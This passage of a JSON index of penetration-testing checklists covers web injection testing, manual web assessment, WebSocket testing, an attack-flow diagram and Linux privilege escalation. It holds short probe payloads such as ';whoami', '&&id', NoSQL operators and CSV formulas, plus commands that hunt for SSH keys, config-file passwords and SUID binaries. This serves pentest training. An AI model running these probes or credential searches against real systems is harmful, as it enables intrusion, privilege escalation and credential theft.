Response length\r\n- Time differences\r\n\r\n---\r\n\r\n# 3. SQL Injection\r\n\r\nCheck every parameter.\r\n\r\nLook for:\r\n\r\n- Error-based SQLi\r\n- Boolean-based SQLi\r\n- Time-based SQLi\r\n- UNION SQLi\r\n- Stacked Queries\r\n- Second-order SQLi\r\n\r\nUseful tools:\r\n\r\n- sqlmap\r\n- Burp Repeater\r\n\r\n---\r\n\r\n# 4. NoSQL Injection\r\n\r\nCommon targets:\r\n\r\n- MongoDB\r\n- CouchDB\r\n\r\nTest:\r\n\r\n```\r\n{\"$ne\":null}\r\n```\r\n\r\n```\r\n{\"$gt\":\"\"}\r\n```\r\n\r\n```\r\n'||1==1//\r\n```\r\n\r\n---\r\n\r\n# 5. Command Injection\r\n\r\nTest:\r\n\r\n```\r\n;\r\n&\r\n|\r\n||\r\n&&\r\n`\r\n$()\r\n```\r\n\r\nExamples:\r\n\r\n```\r\n;whoami\r\n```\r\n\r\n```\r\n&&id\r\n```\r\n\r\n```\r\n|ping\r\n```\r\n\r\n---\r\n\r\n# 6. Server-Side Template Injection (SSTI)\r\n\r\nCommon payload:\r\n\r\n```\r\n{{7*7}}\r\n```\r\n\r\nOther engines:\r\n\r\n- Twig\r\n- Jinja2\r\n- Freemarker\r\n- Velocity\r\n- Smarty\r\n- Handlebars\r\n- Mustache\r\n\r\n---\r\n\r\n# 7. Cross-Site Scripting (XSS)\r\n\r\nTest:\r\n\r\n- Reflected\r\n- Stored\r\n- DOM\r\n\r\nInjection points:\r\n\r\n- Search\r\n- Comments\r\n- Profile\r\n- Messages\r\n- File Names\r\n\r\n---\r\n\r\n# 8. XXE\r\n\r\nIf XML is accepted:\r\n\r\nTest:\r\n\r\n- External entities\r\n- File disclosure\r\n- SSRF\r\n\r\nTargets:\r\n\r\n- SOAP\r\n- XML Upload\r\n- SVG\r\n\r\n---\r\n\r\n# 9. SSRF\r\n\r\nLook for:\r\n\r\n- Image URL\r\n- PDF Generator\r\n- Webhooks\r\n- URL Preview\r\n- Import Features\r\n\r\nTest:\r\n\r\n- localhost\r\n- 127.0.0.1\r\n- Metadata endpoints\r\n- Internal IPs\r\n\r\n---\r\n\r\n# 10. LDAP Injection\r\n\r\nCommon targets:\r\n\r\n- Login\r\n- Search\r\n\r\n---\r\n\r\n# 11. XPath Injection\r\n\r\nCommon targets:\r\n\r\n- XML Authentication\r\n- XML Search\r\n\r\n---\r\n\r\n# 12. CRLF Injection\r\n\r\nTest:\r\n\r\n```\r\n%0d%0a\r\n```\r\n\r\nLook for:\r\n\r\n- Header Injection\r\n- Response Splitting\r\n\r\n---\r\n\r\n# 13. HTTP Parameter Pollution\r\n\r\nDuplicate parameters.\r\n\r\nExample:\r\n\r\n```\r\nid=1&id=2\r\n```\r\n\r\n---\r\n\r\n# 14. Prototype Pollution\r\n\r\nJSON APIs.\r\n\r\nLook for:\r\n\r\n```\r\n__proto__\r\nconstructor\r\nprototype\r\n```\r\n\r\n---\r\n\r\n# 15. HTTP Request Smuggling\r\n\r\nOnly if:\r\n\r\n- Reverse Proxy\r\n- Load Balancer\r\n- Multiple HTTP Servers\r\n\r\n---\r\n\r\n# 16. Open Redirect\r\n\r\nCheck:\r\n\r\n```\r\nredirect=\r\nnext=\r\nreturn=\r\nurl=\r\ncontinue=\r\n```\r\n\r\n---\r\n\r\n# 17. XML Injection\r\n\r\nIf XML is accepted.\r\n\r\n---\r\n\r\n# 18. CSV Injection\r\n\r\nExport functionality.\r\n\r\nPayloads:\r\n\r\n```\r\n=cmd\r\n```\r\n\r\n```\r\n=HYPERLINK(...)\r\n```\r\n\r\n---\r\n\r\n# 19. Expression Language Injection\r\n\r\nFrameworks:\r\n\r\n- Spring\r\n- JSP\r\n- JSF\r\n\r\n---\r\n\r\n# 20. Template Enumeration\r\n\r\nIdentify:\r\n\r\n- Jinja2\r\n- Twig\r\n- Freemarker\r\n- Velocity\r\n- Handlebars\r\n- Smarty\r\n\r\n---\r\n\r\n# 21. Fuzz Every Parameter\r\n\r\nAfter manual testing.\r\n\r\nUse:\r\n\r\n- Burp Intruder\r\n- ffuf\r\n- Turbo Intruder\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Every parameter deserves testing.\r\n- APIs are often less protected than the UI.\r\n- Don't rely solely on sqlmap.\r\n- Read error messages carefully.\r\n- A single vulnerable parameter can lead to complete compromise.\r\n- Always test manually before using automation.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Identify all user-controlled input.\r\n- [ ] Perform initial input validation.\r\n- [ ] Test SQL Injection.\r\n- [ ] Test NoSQL Injection.\r\n- [ ] Test Command Injection.\r\n- [ ] Test SSTI.\r\n- [ ] Test XSS.\r\n- [ ] Test XXE.\r\n- [ ] Test SSRF.\r\n- [ ] Test LDAP Injection.\r\n- [ ] Test XPath Injection.\r\n- [ ] Test CRLF Injection.\r\n- [ ] Test HTTP Parameter Pollution.\r\n- [ ] Test Prototype Pollution.\r\n- [ ] Test HTTP Request Smuggling.\r\n- [ ] Test Open Redirect.\r\n- [ ] Test XML Injection.\r\n- [ ] Test CSV Injection.\r\n- [ ] Test Expression Language Injection.\r\n- [ ] Fuzz all parameters.",
    "headings": [],
    "commands": [],
    "tags": [
      "ffuf",
      "sqlmap",
      "burp",
      "ldap",
      "jwt",
      "sqli",
      "xss",
      "ssrf",
      "xxe"
    ],
    "size": 4208,
    "lineCount": 387
  },
  {
    "id": "web-checklist-04-manual-web-assessment",
    "title": "Manual Web Assessment",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/04. Manual Web Assessment.md",
    "content": "# Manual Web Assessment\r\n\r\n## Objective\r\n\r\nInteract with every feature of the application to understand its functionality, identify hidden behavior, and discover vulnerabilities that automated tools cannot detect.\r\n\r\n> **Rule:** Never rely solely on automated scanners. Manual testing finds the majority of real-world vulnerabilities.\r\n\r\n---\r\n\r\n# 1. Browse the Entire Application\r\n\r\nVisit every page and every link.\r\n\r\nLook for:\r\n\r\n- Login pages\r\n- Registration pages\r\n- Forgot Password\r\n- Contact forms\r\n- Search functionality\r\n- File uploads\r\n- Profile pages\r\n- Settings\r\n- Admin panels\r\n- Dashboards\r\n- API documentation\r\n\r\nTake notes on every feature.\r\n\r\n---\r\n\r\n# 2. Use Burp Suite for Everything\r\n\r\nAdd the target to scope before browsing.\r\n\r\nIntercept every request.\r\n\r\nInspect:\r\n\r\n- GET parameters\r\n- POST parameters\r\n- Cookies\r\n- Headers\r\n- JSON bodies\r\n- XML bodies\r\n- Multipart requests\r\n\r\nNever browse the application without Burp.\r\n\r\n---\r\n\r\n# 3. Review Every Request\r\n\r\nFor every request ask 'Can I':\r\n\r\n- Change the HTTP method?\r\n- Remove a parameter?\r\n- Add a parameter?\r\n- Change an ID?\r\n- Change a filename?\r\n- Change the Content-Type?\r\n- Remove authentication?\r\n- Replay the request?\r\n- Change my role?\r\n- Send it to another endpoint?\r\n\r\n---\r\n\r\n# 4. Review Every Response\r\n\r\nResponses frequently contain useful information.\r\n\r\nLook for:\r\n\r\n- Hidden IDs\r\n- User roles\r\n- UUIDs\r\n- API endpoints\r\n- Internal paths\r\n- Version numbers\r\n- Debug messages\r\n- Stack traces\r\n- Tokens\r\n\r\nDon't only analyze requests—responses often reveal more.\r\n\r\n---\r\n\r\n# 5. View Page Source\r\n\r\nReview every page source.\r\n\r\nLook for:\r\n\r\n- HTML comments\r\n- TODO comments\r\n- Disabled functionality\r\n- Hidden forms\r\n- Hidden inputs\r\n- API endpoints\r\n- JavaScript references\r\n- Secrets\r\n\r\n---\r\n\r\n# 6. Analyze JavaScript\r\n\r\nInspect every JavaScript file.\r\n\r\nSearch for:\r\n\r\n- Hidden endpoints\r\n- Internal APIs\r\n- API Keys\r\n- JWTs\r\n- Access Tokens\r\n- Hardcoded credentials\r\n- Debug functionality\r\n- Admin-only functions\r\n\r\nUseful tools:\r\n\r\n- LinkFinder\r\n- SecretFinder\r\n- JSParser\r\n\r\n---\r\n\r\n# 7. Manipulate Parameters\r\n\r\nModify every parameter.\r\n\r\nTry:\r\n\r\n- Negative numbers\r\n- Large numbers\r\n- NULL\r\n- Empty values\r\n- Boolean values\r\n- Different data types\r\n- UUIDs\r\n- Other user's IDs\r\n\r\nNever trust client-side validation.\r\n\r\n---\r\n\r\n# 8. Check for IDOR\r\n\r\nWhenever IDs appear:\r\n\r\nTry changing:\r\n\r\n```\r\n/profile?id=1\r\n```\r\n\r\n↓\r\n\r\n```\r\n/profile?id=2\r\n```\r\n\r\nLook for:\r\n\r\n- User profiles\r\n- Orders\r\n- Invoices\r\n- Documents\r\n- Images\r\n- Downloads\r\n\r\n---\r\n\r\n# 9. Test HTTP Methods\r\n\r\nTry:\r\n\r\n- GET\r\n- POST\r\n- PUT\r\n- PATCH\r\n- DELETE\r\n\r\nSome endpoints accept multiple methods.\r\n\r\n---\r\n\r\n# 10. Check Authentication State\r\n\r\nTest requests:\r\n\r\n- Logged in\r\n- Logged out\r\n- Different user\r\n- Different role\r\n\r\nMany authorization issues appear only after changing accounts.\r\n\r\n---\r\n\r\n# 11. Manipulate JSON Requests\r\n\r\nIf JSON is used:\r\n\r\nTry adding fields.\r\n\r\nExample:\r\n\r\n```json\r\n{\r\n    \"username\":\"test\",\r\n    \"password\":\"Password123!\",\r\n    \"role\":\"admin\",\r\n    \"isAdmin\":true,\r\n    \"verified\":true\r\n}\r\n```\r\n\r\nCommon Mass Assignment fields:\r\n\r\n- role\r\n- isAdmin\r\n- admin\r\n- verified\r\n- enabled\r\n- active\r\n- userType\r\n- permissions\r\n\r\n---\r\n\r\n# 12. Review Cookies\r\n\r\nInspect every cookie.\r\n\r\nCheck:\r\n\r\n- JWT\r\n- Session ID\r\n- Base64\r\n- Serialized objects\r\n\r\nAttempt decoding.\r\n\r\n---\r\n\r\n# 13. Trigger Error Conditions\r\n\r\nGenerate unexpected input.\r\n\r\nExamples:\r\n\r\n```\r\n'\r\n\"\r\n\\\r\n../../\r\n{{7*7}}\r\n${7*7}\r\n<test>\r\n```\r\n\r\nFramework errors frequently reveal:\r\n\r\n- Versions\r\n- Stack traces\r\n- File paths\r\n- SQL queries\r\n\r\n---\r\n\r\n# 14. Compare User Roles\r\n\r\nIf multiple accounts exist:\r\n\r\nCompare:\r\n\r\n- Requests\r\n- Responses\r\n- Cookies\r\n- APIs\r\n- Navigation\r\n\r\nDifferent roles often expose hidden functionality.\r\n\r\n---\r\n\r\n# 15. Document Interesting Endpoints\r\n\r\nRecord:\r\n\r\n- APIs\r\n- Uploads\r\n- Downloads\r\n- Admin pages\r\n- Profile pages\r\n- Export functions\r\n- Import functions\r\n\r\nThese become primary targets during exploitation.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Read every response carefully.\r\n- Modify every parameter at least once.\r\n- Every numeric ID should be tested for IDOR.\r\n- Review every JavaScript file.\r\n- Never trust hidden fields or disabled buttons.\r\n- Burp Repeater is your best friend during manual testing.\r\n- Client-side restrictions can often be bypassed by modifying requests.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Browse every page.\r\n- [ ] Proxy all traffic through Burp Suite.\r\n- [ ] Inspect every request.\r\n- [ ] Inspect every response.\r\n- [ ] Review page source.\r\n- [ ] Analyze JavaScript files.\r\n- [ ] Manipulate parameters.\r\n- [ ] Test for IDOR.\r\n- [ ] Test different HTTP methods.\r\n- [ ] Compare authenticated and unauthenticated requests.\r\n- [ ] Test JSON for Mass Assignment.\r\n- [ ] Review cookies.\r\n- [ ] Trigger error conditions.\r\n- [ ] Compare different user roles.\r\n- [ ] Document interesting endpoints.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "jwt",
      "idor",
      "rce"
    ],
    "size": 4891,
    "lineCount": 334
  },
  {
    "id": "web-checklist-00-web-pentesting-methodology-attack-flow",
    "title": "Web Pentesting Methodology (Attack Flow)",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/00. Web Pentesting Methodology (Attack Flow).md",
    "content": "```\r\nTarget\r\n   │\r\n   ▼\r\nInitial Enumeration\r\n   │\r\n   ▼\r\nTechnology Fingerprinting\r\n   │\r\n   ▼\r\nContent Discovery\r\n   │\r\n   ▼\r\nManual Assessment\r\n   │\r\n   ▼\r\nAuthentication Testing\r\n   │\r\n   ▼\r\nAuthorization Testing\r\n   │\r\n   ▼\r\nInjection Testing\r\n   │\r\n   ▼\r\nAPI Testing\r\n   │\r\n   ▼\r\nFile Handling\r\n   │\r\n   ▼\r\nBusiness Logic\r\n   │\r\n   ▼\r\nCMS / Framework Testing\r\n   │\r\n   ▼\r\nClient-Side Testing\r\n   │\r\n   ▼\r\nWebSocket Testing\r\n   │\r\n   ▼\r\nRCE?\r\n ┌───────────────┐\r\n │      No       │──────────────► Continue Enumeration\r\n └───────────────┘\r\n         │\r\n        Yes\r\n         ▼\r\nPost-Exploitation\r\n         │\r\n         ▼\r\nPrivilege Escalation\r\n         │\r\n         ▼\r\nCredential Harvesting\r\n         │\r\n         ▼\r\nPivoting\r\n         │\r\n         ▼\r\nLateral Movement\r\n         │\r\n         ▼\r\nDomain Compromise (if applicable)\r\n```",
    "headings": [],
    "commands": [],
    "tags": [
      "rce",
      "lateral movement"
    ],
    "size": 1013,
    "lineCount": 67
  },
  {
    "id": "web-checklist-13-websocket-security-testing",
    "title": "WebSocket Security Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/13. WebSocket Security Testing.md",
    "content": "# WebSocket Security Testing\r\n\r\n## Objective\r\n\r\nAssess WebSocket communication for authentication, authorization, input validation, business logic, and message handling vulnerabilities.\r\n\r\n> **Rule:** Treat every WebSocket as a separate API. Every message can potentially be manipulated.\r\n\r\n---\r\n\r\n# 1. Identify WebSockets\r\n\r\nLook for:\r\n\r\n- `ws://`\r\n- `wss://`\r\n\r\nCheck:\r\n\r\n- Browser Developer Tools → Network → WS\r\n- Burp Suite Proxy\r\n- JavaScript files\r\n\r\nReview:\r\n\r\n- Connection URL\r\n- Parameters\r\n- Authentication method\r\n- Initial handshake\r\n\r\n---\r\n\r\n# 2. Analyze the Handshake\r\n\r\nInspect the initial WebSocket request.\r\n\r\nReview:\r\n\r\n- Cookies\r\n- JWTs\r\n- API Keys\r\n- Authorization Headers\r\n- Origin Header\r\n- Sec-WebSocket-Key\r\n- Query Parameters\r\n\r\nDetermine how authentication is performed.\r\n\r\n---\r\n\r\n# 3. Authentication Testing\r\n\r\nTest:\r\n\r\n- Missing authentication\r\n- Expired tokens\r\n- Invalid tokens\r\n- Anonymous connections\r\n- Session reuse\r\n\r\nDetermine whether authentication is enforced only during connection establishment or for every action.\r\n\r\n---\r\n\r\n# 4. Authorization Testing\r\n\r\nTest whether users can perform unauthorized actions.\r\n\r\nExamples:\r\n\r\n- Read another user's messages\r\n- Send messages as another user\r\n- Join unauthorized channels\r\n- Subscribe to restricted topics\r\n\r\nAlways compare multiple user accounts.\r\n\r\n---\r\n\r\n# 5. Message Tampering\r\n\r\nModify every message.\r\n\r\nTest:\r\n\r\n- IDs\r\n- UUIDs\r\n- Roles\r\n- Usernames\r\n- Object IDs\r\n- Channel IDs\r\n\r\nExamples:\r\n\r\n```json\r\n{\r\n  \"userId\": 5\r\n}\r\n```\r\n\r\n↓\r\n\r\n```json\r\n{\r\n  \"userId\": 1\r\n}\r\n```\r\n\r\n---\r\n\r\n# 6. Input Validation\r\n\r\nTest every message for:\r\n\r\n- SQL Injection\r\n- NoSQL Injection\r\n- XSS\r\n- SSTI\r\n- Command Injection\r\n- LDAP Injection\r\n- XXE (XML messages)\r\n- Path Traversal\r\n\r\nTreat WebSocket messages exactly like HTTP requests.\r\n\r\n---\r\n\r\n# 7. Message Replay\r\n\r\nReplay captured messages.\r\n\r\nDetermine:\r\n\r\n- Can messages be reused?\r\n- Are timestamps validated?\r\n- Are nonces enforced?\r\n\r\nUseful for:\r\n\r\n- Payments\r\n- Chat\r\n- Transactions\r\n- Voting\r\n- Notifications\r\n\r\n---\r\n\r\n# 8. Business Logic Testing\r\n\r\nReview application logic.\r\n\r\nTest:\r\n\r\n- Duplicate actions\r\n- Workflow bypass\r\n- Invalid state changes\r\n- Negative values\r\n- Replay attacks\r\n\r\n---\r\n\r\n# 9. Race Conditions\r\n\r\nSend multiple messages simultaneously.\r\n\r\nExamples:\r\n\r\n- Wallet operations\r\n- Purchases\r\n- Transfers\r\n- Voting\r\n- Rewards\r\n- Inventory\r\n\r\nUseful tools:\r\n\r\n- Burp Repeater\r\n- Turbo Intruder\r\n- Custom scripts\r\n\r\n---\r\n\r\n# 10. Channel Enumeration\r\n\r\nIdentify:\r\n\r\n- Public channels\r\n- Private channels\r\n- Admin channels\r\n- Notification channels\r\n\r\nAttempt subscribing to unauthorized channels.\r\n\r\n---\r\n\r\n# 11. Sensitive Information Disclosure\r\n\r\nInspect every message.\r\n\r\nLook for:\r\n\r\n- Internal IPs\r\n- Stack traces\r\n- User roles\r\n- Session IDs\r\n- API Keys\r\n- Password hashes\r\n- Email addresses\r\n\r\n---\r\n\r\n# 12. Client-Side Validation\r\n\r\nModify messages directly.\r\n\r\nNever rely on:\r\n\r\n- Disabled UI controls\r\n- JavaScript validation\r\n- Hidden fields\r\n\r\n---\r\n\r\n# 13. Rate Limiting\r\n\r\nDetermine whether message frequency is restricted.\r\n\r\nTest:\r\n\r\n- Message flooding\r\n- Login attempts\r\n- OTP requests\r\n- Chat spam\r\n- Notifications\r\n\r\n---\r\n\r\n# 14. Origin Validation\r\n\r\nReview the `Origin` header during the WebSocket handshake.\r\n\r\nDetermine whether unauthorized origins can establish a connection.\r\n\r\n---\r\n\r\n# 15. Connection Management\r\n\r\nReview:\r\n\r\n- Session timeout\r\n- Idle timeout\r\n- Logout behavior\r\n- Reconnection handling\r\n\r\nDetermine whether old sessions remain valid after logout.\r\n\r\n---\r\n\r\n# 16. API Mapping\r\n\r\nDocument:\r\n\r\n- Message types\r\n- Endpoints\r\n- Channels\r\n- Events\r\n- Parameters\r\n- Authentication requirements\r\n\r\nTreat the WebSocket protocol as another API surface.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Every WebSocket message is equivalent to an API request.\r\n- Test authorization on every action, not just the initial connection.\r\n- Replay messages and modify object identifiers.\r\n- Compare messages between multiple user roles.\r\n- Inspect both the WebSocket handshake and subsequent messages.\r\n- Use Burp Suite's WebSocket history to replay and modify traffic.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Identify WebSocket endpoints.\r\n- [ ] Analyze the handshake.\r\n- [ ] Test authentication.\r\n- [ ] Test authorization.\r\n- [ ] Modify message parameters.\r\n- [ ] Test input validation.\r\n- [ ] Replay captured messages.\r\n- [ ] Test business logic.\r\n- [ ] Test race conditions.\r\n- [ ] Enumerate channels.\r\n- [ ] Check for sensitive information disclosure.\r\n- [ ] Bypass client-side validation.\r\n- [ ] Test rate limiting.\r\n- [ ] Validate Origin handling.\r\n- [ ] Review session management.\r\n- [ ] Document the WebSocket API.",
    "headings": [],
    "commands": [],
    "tags": [
      "burp",
      "ldap",
      "jwt",
      "rce",
      "xss",
      "xxe"
    ],
    "size": 4671,
    "lineCount": 302
  },
  {
    "id": "privesc-checklist-linux-privilege-escalation",
    "title": "Linux Privilege Escalation",
    "category": "Privilege Escalation",
    "subcategory": "PrivEsc-Checklist",
    "filePath": "PrivEsc-Checklist/Linux Privilege Escalation.md",
    "content": "# Linux Privilege Escalation Checklist\r\n\r\n## Objective\r\n\r\nIdentify local privilege escalation vectors, recover credentials, exploit misconfigurations, and obtain root privileges.\r\n\r\n> **Rule:** Enumerate manually first, then validate findings with automated tools.\r\n\r\n---\r\n\r\n# 1. Basic Enumeration\r\n\r\nDetermine:\r\n\r\n- Current user\r\n- Groups\r\n- Hostname\r\n- Kernel version\r\n- Distribution\r\n- Architecture\r\n\r\n```bash\r\nwhoami\r\nid\r\nhostname\r\nuname -a\r\ncat /etc/os-release\r\n```\r\n\r\nCheck:\r\n\r\n- Environment variables\r\n- PATH\r\n- HOME\r\n- SHELL\r\n\r\n```bash\r\nenv\r\necho $PATH\r\n```\r\n\r\nLook for:\r\n\r\n- Credentials\r\n- API keys\r\n- Interesting usernames\r\n\r\n---\r\n\r\n# 2. Automated Enumeration\r\n\r\nRun:\r\n\r\n- LinPEAS\r\n- LinEnum\r\n- pspy\r\n\r\n---\r\n\r\n# 3. Environment Variables\r\n\r\nReview:\r\n\r\n```bash\r\nenv\r\nprintenv\r\necho $PATH\r\n```\r\n\r\nLook for:\r\n\r\n- Credentials\r\n- Tokens\r\n- Writable PATH\r\n- API Keys\r\n\r\n---\r\n\r\n# 4. Sudo Permissions\r\n\r\n```bash\r\nsudo -l\r\n```\r\n\r\nLook for:\r\n\r\n- NOPASSWD\r\n- Environment preservation\r\n- Wildcards\r\n- Allowed binaries\r\n\r\nReference:\r\n\r\n- GTFOBins\r\n\r\n---\r\n\r\n# 5. SUID Binaries\r\n\r\n```bash\r\nfind / -perm -4000 -type f 2>/dev/null\r\n```\r\n\r\nCheck every uncommon binary against GTFOBins.\r\n\r\n---\r\n\r\n# 6. Linux Capabilities\r\n\r\n```bash\r\ngetcap -r / 2>/dev/null\r\n```\r\n\r\nInteresting:\r\n\r\n- cap_setuid\r\n- cap_setgid\r\n- cap_dac_override\r\n- cap_sys_admin\r\n\r\nReference:\r\n\r\n- GTFOBins\r\n\r\n---\r\n\r\n# 7. Cron Jobs\r\n\r\nReview:\r\n\r\n```bash\r\ncat /etc/crontab\r\nls -la /etc/cron*\r\ncrontab -l\r\n```\r\n\r\nRun:\r\n\r\n```bash\r\npspy64\r\n```\r\n\r\nLook for:\r\n\r\n- Hidden cron jobs\r\n- Writable scripts\r\n- PATH hijacking\r\n\r\n---\r\n\r\n# 8. Systemd Services & Timers\r\n\r\nEnumerate services:\r\n\r\n```bash\r\nsystemctl list-units --type=service\r\n```\r\n\r\nTimers:\r\n\r\n```bash\r\nsystemctl list-timers --all\r\n```\r\n\r\nLook for:\r\n\r\n- Writable service files\r\n- Writable timer scripts\r\n- Custom services\r\n\r\n---\r\n\r\n# 9. Writable Files\r\n\r\nInteresting targets:\r\n\r\n```bash\r\nfind / -writable -type f 2>/dev/null\r\n```\r\n\r\nCheck:\r\n\r\n```text\r\n/etc/passwd\r\n/etc/shadow\r\n/etc/sudoers\r\n```\r\n\r\n---\r\n\r\n# 10. Running Services\r\n\r\n```bash\r\nss -tunlp\r\n```\r\n\r\nor\r\n\r\n```bash\r\nnetstat -tunlp\r\n```\r\n\r\nFocus on:\r\n\r\n- Localhost services\r\n- Admin panels\r\n- Databases\r\n- APIs\r\n\r\n---\r\n\r\n# 11. Database Enumeration\r\n\r\nLocate databases:\r\n\r\n```bash\r\nfind / -name mysql 2>/dev/null\r\nfind / -name psql 2>/dev/null\r\nfind / -name redis-cli 2>/dev/null\r\n```\r\n\r\nSearch:\r\n\r\n```text\r\n/var/www/\r\n/var/www/html/\r\n/opt/\r\n/srv/\r\n```\r\n\r\nLook for:\r\n\r\n- Database credentials\r\n- Root passwords\r\n\r\n---\r\n\r\n# 12. Configuration Files\r\n\r\nSearch:\r\n\r\n```bash\r\nfind / -type f \\( \\\r\n-name \".env\" -o \\\r\n-name \"config.php\" -o \\\r\n-name \"wp-config.php\" -o \\\r\n-name \"settings.py\" -o \\\r\n-name \"application.properties\" -o \\\r\n-name \"database.yml\" \\\r\n\\) 2>/dev/null\r\n```\r\n\r\nLook for:\r\n\r\n- Passwords\r\n- SSH Keys\r\n- API Keys\r\n- Tokens\r\n\r\n---\r\n\r\n# 13. SSH Credentials\r\n\r\n```bash\r\nfind /home -name id_rsa 2>/dev/null\r\nfind /home -name authorized_keys 2>/dev/null\r\nfind /home -name known_hosts 2>/dev/null\r\n```\r\n\r\n---\r\n\r\n# 14. Password Reuse\r\n\r\nAlways try:\r\n\r\n```\r\nusername : username\r\nroot : root\r\n```\r\n\r\nAlso try recovered passwords for:\r\n\r\n- sudo\r\n- su\r\n- SSH\r\n- Databases\r\n\r\n---\r\n\r\n# 15. Mail Enumeration\r\n\r\n```bash\r\ncat /var/mail/*\r\ncat /var/spool/mail/*\r\n```\r\n\r\nLook for:\r\n\r\n- Credentials\r\n- Password resets\r\n- Internal communications\r\n\r\n---\r\n\r\n# 16. Interesting Groups\r\n\r\n```bash\r\nid\r\ngroups\r\n```\r\n\r\nInteresting groups:\r\n\r\n- docker\r\n- disk\r\n- lxd\r\n- adm\r\n- shadow\r\n- sudo\r\n- wheel\r\n- libvirt\r\n- kvm\r\n\r\n---\r\n\r\n# 17. Docker Privilege Escalation\r\n\r\nCheck:\r\n\r\n```bash\r\ngroups\r\n```\r\n\r\nIf in docker group:\r\n\r\n```bash\r\ndocker images\r\ndocker ps\r\n```\r\n\r\nDocker group membership frequently leads to root.\r\n\r\n---\r\n\r\n# 18. LXD / LXC Privilege Escalation\r\n\r\nCheck:\r\n\r\n```bash\r\ngroups\r\n```\r\n\r\nLook for:\r\n\r\n```\r\nlxd\r\n```\r\n\r\nLXD group membership frequently allows root access.\r\n\r\n---\r\n\r\n# 19. NFS Misconfigurations\r\n\r\nCheck mounted shares:\r\n\r\n```bash\r\nmount\r\ncat /etc/fstab\r\nshowmount -e <SERVER>\r\n```\r\n\r\nLook for:\r\n\r\n- no_root_squash\r\n- Writable exports\r\n\r\n---\r\n\r\n# 20. Kernel Exploits\r\n\r\nReview:\r\n\r\n```bash\r\nuname -a\r\n```\r\n\r\nCommon:\r\n\r\n- PwnKit\r\n- DirtyPipe\r\n- DirtyCow\r\n- OverlayFS\r\n\r\nAlways verify exploit applicability.\r\n\r\n---\r\n\r\n# 21. Suspicious Binaries\r\n\r\nInspect:\r\n\r\n```bash\r\nstrings <binary>\r\n```\r\n\r\nLook for:\r\n\r\n- Passwords\r\n- API Keys\r\n- Hidden functionality\r\n- Missing libraries\r\n\r\n---\r\n\r\n# 22. Shared Library Hijacking\r\n\r\nCheck:\r\n\r\n```bash\r\nldd <binary>\r\n```\r\n\r\nErrors:\r\n\r\n```\r\ncannot open shared object file\r\n```\r\n\r\nCreate missing libraries where applicable.\r\n\r\n---\r\n\r\n# 23. PATH Hijacking\r\n\r\nCheck:\r\n\r\n```bash\r\necho $PATH\r\n```\r\n\r\nReview scripts for binaries called without absolute paths.\r\n\r\n---\r\n\r\n# 24. Wildcard Injection\r\n\r\nReview scripts using:\r\n\r\n- tar\r\n- rsync\r\n- zip\r\n- chmod\r\n- chown\r\n\r\nLook for:\r\n\r\n```bash\r\ntar *\r\n```\r\n\r\ninstead of:\r\n\r\n```bash\r\ntar -- *\r\n```\r\n\r\nCron jobs often execute these as root.\r\n\r\n---\r\n\r\n# 25. Backup Scripts\r\n\r\nSearch:\r\n\r\n```bash\r\nfind / -name \"*backup*\" 2>/dev/null\r\nfind / -name \"*.sh\" 2>/dev/null\r\n```\r\n\r\nLook for:\r\n\r\n- Root-owned scripts\r\n- Writable scripts\r\n- Credentials\r\n- PATH hijacking\r\n\r\n---\r\n\r\n# 26. Mounted Filesystems\r\n\r\n```bash\r\nmount\r\ncat /etc/fstab\r\nlsblk\r\ndf -h\r\n```\r\n\r\nLook for:\r\n\r\n- Writable mounts\r\n- NFS\r\n- CIFS\r\n- Docker mounts\r\n\r\n---\r\n\r\n# 27. Containers\r\n\r\nDetermine:\r\n\r\n```bash\r\ncat /proc/1/cgroup\r\n```\r\n\r\nCheck:\r\n\r\n- Docker\r\n- Kubernetes\r\n- LXC\r\n\r\nLook for:\r\n\r\n- Docker socket\r\n- Privileged containers\r\n- Mounted host filesystem\r\n\r\n---\r\n\r\n# 28. Checklist\r\n\r\n- [ ] Run manual enumeration.\r\n- [ ] Run LinPEAS.\r\n- [ ] Review environment variables.\r\n- [ ] Check `sudo -l`.\r\n- [ ] Enumerate SUID binaries.\r\n- [ ] Enumerate capabilities.\r\n- [ ] Check cron jobs.\r\n- [ ] Review systemd services and timers.\r\n- [ ] Search writable files.\r\n- [ ] Enumerate running services.\r\n- [ ] Enumerate databases.\r\n- [ ] Search configuration files.\r\n- [ ] Check SSH keys.\r\n- [ ] Test password reuse.\r\n- [ ] Read local mail.\r\n- [ ] Review user groups.\r\n- [ ] Check Docker group.\r\n- [ ] Check LXD/LXC group.\r\n- [ ] Check NFS misconfigurations.\r\n- [ ] Review kernel exploits.\r\n- [ ] Analyze suspicious binaries.\r\n- [ ] Check shared library hijacking.\r\n- [ ] Check PATH hijacking.\r\n- [ ] Check wildcard injection.\r\n- [ ] Review backup scripts.\r\n- [ ] Review mounted filesystems.\r\n- [ ] Check for container escapes.",
    "headings": [],
    "commands": [],
    "tags": [
      "linpeas",
      "gtfobins",
      "sudo",
      "suid"
    ],
    "size": 6309,
    "lineCount": 558
  },
  {
    "id": "web-checklist-14-post-exploitation-privilege-escalation",
    "title": "Post-Exploitation & Privilege Escalation",
    "category": "Privilege Escalation",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/14. Post-Exploitation & Privilege Escalation.md",
